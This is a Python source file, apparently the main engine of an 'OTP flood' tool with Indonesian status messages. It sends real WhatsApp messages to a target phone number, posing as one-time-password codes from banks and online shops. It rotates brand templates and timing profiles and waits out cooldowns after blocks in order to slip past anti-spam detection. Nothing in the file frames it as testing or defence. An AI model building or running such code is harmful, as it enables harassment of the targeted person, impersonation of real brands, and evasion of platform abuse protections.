"""
OTP Flood - Main Engine
Orchestrates the flood execution flow with real WhatsApp delivery
"""

from datetime import datetime
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.otp_flood.profiles import PROFILES, get_generator
from modules.otp_flood.templates import (
    CATEGORIES,
    get_brands_by_category,
    format_brand_message,
)
from modules.otp_flood.sender import Sender, color
from modules.otp_flood.reporter import generate_report, save_report


def run_flood(config):
    """
    Execute OTP flood with given configuration.

    config: {
        "target": "62812xxxxxxx",
        "profile": "linear|exponential|random|rotating",
        "interval": 3,
        "max_messages": 100,
        "categories": ["bank", "e-commerce", ...] or "ALL",
        "block_cooldown": 60,
    }
    """
    target = config["target"]
    profile_key = config.get("profile", "linear")
    max_msgs = config.get("max_messages", 50)
    block_cooldown = config.get("block_cooldown", 60)
    rotate = profile_key == "rotating"

    # Get brands
    cats = config.get("categories")
    brands = get_brands_by_category(cats)

    # Setup sender & generator
    sender = Sender(target)
    gen = get_generator(profile_key, {"interval": config.get("interval", 3)})

    # Execution state
    results = {
        "total_sent": 0,
        "total_blocked": 0,
        "total_errors": 0,
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "end_time": "",
        "logs": [],
    }

    brand_idx = 0
    consecutive_blocks = 0
    first_run = True

    # Send QR auth notification on first run
    yield f"\n  {color.B}{color.CYN}⏳ Persiapan WhatsApp...\n  Jika muncul QR Code, scan dengan WhatsApp Anda.{color.RST}\n\n"

    for i in range(max_msgs):
        # Pick brand
        if rotate and brands:
            brand = brands[i % len(brands)]
        elif brands:
            brand = brands[0]
        else:
            brand = None

        # Generate message
        if brand:
            msg_data = format_brand_message(brand)
        else:
            msg_data = {
                "brand": "Generic",
                "category": "unknown",
                "otp": "------",
                "message": f"Kode OTP Anda: {str(abs(hash(str(i)) % 1000000)).zfill(6)}",
                "sender": "System",
            }

        # SEND REAL MESSAGE
        result = sender.send(msg_data["message"], msg_data["sender"])

        timestamp = datetime.now().strftime("%H:%M:%S")
        results["logs"].append(
            f"{timestamp}  {msg_data['brand']:<10} - OTP: {msg_data['otp']:<6}"
        )

        if result["status"] == "sent":
            results["total_sent"] += 1
            consecutive_blocks = 0
            icon = "✅"
        elif result["status"] == "blocked":
            results["total_blocked"] += 1
            consecutive_blocks += 1
            icon = "🔴"
        else:
            results["total_errors"] += 1
            consecutive_blocks += 1
            icon = "⚠️"

        # Progress bar
        progress = f"[{i+1}/{max_msgs}]"
        bar_len = 25
        filled = int((i + 1) / max_msgs * bar_len)
        bar = "█" * filled + "░" * (bar_len - filled)

        total_so_far = results["total_sent"] + results["total_blocked"] + results["total_errors"]
        det_rate = results["total_blocked"] / total_so_far * 100 if total_so_far > 0 else 0

        status_line = (
            f"\033[2K{icon} {progress} {bar}\n"
            f"\033[2K  📤 Terkirim: {results['total_sent']} | "
            f"🚫 Kena Blok: {results['total_blocked']} | "
            f"⚠️  Error: {results['total_errors']}\n"
            f"\033[2K  📊 Deteksi: {det_rate:.1f}% | "
            f"🕐 {timestamp}\n"
        )
        yield status_line

        # Cooldown on consecutive blocks
        if consecutive_blocks >= 3:
            yield f"\n\033[2K  ⏸  Diblokir {consecutive_blocks}x berturut-turut! Cooldown {block_cooldown}s...\n"
            for remaining in range(block_cooldown, -1, -1):
                yield f"\033[2K  ⏳ Cooldown: {remaining}s  \r"
                time.sleep(1)
            yield f"\033[2K  ✅ Resume\n"
            consecutive_blocks = 0

        # Wait for next interval
        try:
            wait = next(gen)
            if wait > 0:
                # Show countdown
                for s in range(int(wait), 0, -1):
                    yield f"\033[2K  ⏱  Pesan berikutnya dalam {s}s...\r"
                    time.sleep(1)
        except StopIteration:
            break

    # Final stats
    results["end_time"] = datetime.now().strftime("%H:%M:%S")

    # Generate report
    report_text, grade, det_rate = generate_report(results, config)

    yield f"\n\n{report_text}\n"

    # Save report
    output_dir = os.path.join(
        os.path.dirname(os.path.dirname(__file__)), "reports"
    )
    os.makedirs(output_dir, exist_ok=True)
    saved = save_report(report_text, output_dir)

    if saved:
        yield f"  📄 Report saved: {saved}\n"
